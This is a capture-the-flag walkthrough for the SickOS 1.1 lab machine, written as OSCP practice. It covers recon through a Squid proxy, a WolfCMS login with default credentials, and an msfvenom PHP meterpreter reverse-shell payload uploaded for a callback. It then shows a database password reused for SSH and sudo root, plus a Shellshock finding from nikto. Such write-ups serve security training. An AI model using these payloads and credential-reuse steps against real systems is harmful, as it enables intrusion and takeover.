# INTRO
This is my first machine (thats being uploaded). This machine emulates OSCP labs with the objective being to compromise the machine and gain root privileges.

# RECON AND ENUM
Using netdiscover I found the local ip of the machine and proceeded to run an nmap scan.
```
└─# nmap -A -sC -sV -Pn 192.168.1.152
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-01 21:45 +04
Stats: 0:00:32 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.23% done; ETC: 21:45 (0:00:00 remaining)
Nmap scan report for 192.168.1.152
Host is up (0.018s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 093d29a0da4814c165141e6a6c370409 (DSA)
|   2048 8463e9a88e993348dbf6d581abf208ec (RSA)
|_  256 51f6eb09f6b3e691ae36370cc8ee3427 (ECDSA)
3128/tcp open   http-proxy Squid http proxy 3.1.19
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported: GET HEAD
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/3.1.19
8080/tcp closed http-proxy
MAC Address: 1A:D6:C7:57:EB:DB (Unknown)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT      ADDRESS
1   17.67 ms 192.168.1.152

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.16 seconds

```

I can see that the port 3128 has an http proxy. I configure my browsers proxy settings to access the webpage. Nothing interesting on the page or page source. I ran dirb to search for any directories.
```
└─# dirb http://192.168.1.152 -p 192.168.1.152:3128

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Jan  1 21:51:09 2023
URL_BASE: http://192.168.1.152/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
PROXY: 192.168.1.152:3128

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.1.152/ ----
+ http://192.168.1.152/cgi-bin/ (CODE:403|SIZE:289)                                                                                                                                                                                          
+ http://192.168.1.152/connect (CODE:200|SIZE:109)                                                                                                                                                                                           
+ http://192.168.1.152/index (CODE:200|SIZE:21)                                                                                                                                                                                              
+ http://192.168.1.152/index.php (CODE:200|SIZE:21)                                                                                                                                                                                          
+ http://192.168.1.152/robots (CODE:200|SIZE:45)                                                                                                                                                                                             
+ http://192.168.1.152/robots.txt (CODE:200|SIZE:45)                                                                                                                                                                                         
+ http://192.168.1.152/server-status (CODE:403|SIZE:294)                                                                                                                                                                                     
                                                                                                                                                                                                                                             
-----------------
END_TIME: Sun Jan  1 21:51:49 2023
DOWNLOADED: 4612 - FOUND: 7
```
The robots.txt file gives us the following and leads to a content management system called wolfcms.
```
User-agent: *
Disallow: /
Dissalow: /wolfcms
```
http://192.168.1.152/wolfcms directs to the CMS with nothing special on the page. I tried entering /admin and /login to get to a login page but with no success I searched up the admin page directory for wolfcms and found http://192.168.152/?/admin. Trying to capture the network reqeust I entered the standard credentials admin:admin and I got access.

# EXPLOITATION

I browsed further and came across the file manager and uploaded a reverse tcp meterpreter payload I generated using msfvenom to /public and connected to it with a listener from msfconsole.
```
└─# msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.135 LPORT=4444 -f raw -o shell.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 1114 bytes
Saved as: shell.php
```
After gaining a meterpreter session I found a config.php file and I cat the contents out to find credentials.

# PRIVILEGE ESCALATION

```
// Database settings:
define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306');
define('DB_USER', 'root');
define('DB_PASS', 'john@123');
define('TABLE_PREFIX', '');
```
Moreover I found a user called sickos in the home directory.
```
meterpreter > ls
Listing: /home
==============

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040755/rwxr-xr-x  4096  dir   2015-09-22 07:50:58 +0400  sickos
```
I tried to ssh to sickos with the credentials from the config file and it worked.
```
└─$ ssh sickos@192.168.1.152   
The authenticity of host '192.168.1.152 (192.168.1.152)' can't be established.
ECDSA key fingerprint is SHA256:fBxcsD9oGyzCgdxtn34OtTEDXIW4E9/RlkxombNm0y8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.1.152' (ECDSA) to the list of known hosts.
sickos@192.168.1.152's password: 
Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Mon Jan  2 00:57:57 IST 2023

  System load:  0.0               Processes:           110
  Usage of /:   4.3% of 28.42GB   Users logged in:     0
  Memory usage: 10%               IP address for eth0: 192.168.1.152
  Swap usage:   0%

  Graph this data and manage this system at:
    https://landscape.canonical.com/

124 packages can be updated.
92 updates are security updates.

New release '14.04.3 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Sun Jan  1 16:35:01 2023 from 192.168.1.135
```
And then I simply did 'sudo su' to gain root with the password john@123.
```
sickos@SickOs:~$ sudo su
[sudo] password for sickos: 
root@SickOs:/home/sickos# cd /root
root@SickOs:~# ls
a0216ea4d51874464078c618298b1367.txt
root@SickOs:~# cat a0216ea4d51874464078c618298b1367.txt 
If you are viewing this!!

ROOT!

You have Succesfully completed SickOS1.1.
Thanks for Trying


root@SickOs:~# 
```
There is also another path to root with a shellshock CVE, a nikto scan shows us this.
```
└─# nikto -h 192.168.1.152 --useproxy 192.168.1.152:3128
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.152
+ Target Hostname:    192.168.1.152
+ Target Port:        80
+ Proxy:              192.168.1.152:3128
+ Start Time:         2023-01-01 23:35:22 (GMT4)
---------------------------------------------------------------------------
+ Server: Apache/2.2.22 (Ubuntu)
+ Retrieved via header: 1.0 localhost (squid/3.1.19)
+ Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.21
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'x-cache-lookup' found, with contents: MISS from localhost:3128
+ Uncommon header 'x-cache' found, with contents: MISS from localhost
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Server may leak inodes via ETags, header found with file /robots.txt, inode: 265381, size: 45, mtime: Sat Dec  5 04:35:02 2015
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.php
+ Server banner has changed from 'Apache/2.2.22 (Ubuntu)' to 'squid/3.1.19' which may suggest a WAF, load balancer or proxy is in place
+ Uncommon header 'x-squid-error' found, with contents: ERR_INVALID_URL 0
+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Uncommon header '93e4r0-cve-2014-6278' found, with contents: true
+ OSVDB-112004: /cgi-bin/status: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
```
